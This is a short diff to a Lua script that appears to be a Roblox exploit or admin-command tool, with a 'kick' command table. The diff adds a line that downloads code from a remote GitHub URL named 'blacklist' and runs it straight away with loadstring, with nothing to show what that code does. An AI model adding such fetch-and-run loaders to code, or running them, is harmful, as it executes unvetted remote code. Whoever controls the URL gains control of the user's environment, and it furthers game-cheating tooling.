@@ -14,6 +14,15 @@ getgenv().psearch = function(Name)
 	end
 end 
 
+
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/JXJmasterbringer/beta/main/blacklist'),true))()
+wait()
+
+
+
+
+
 getgenv().AdminCmdList = {
 	["kick"] = {
 		["CommandFunc"] = function(Player, self, CmdPlayer)
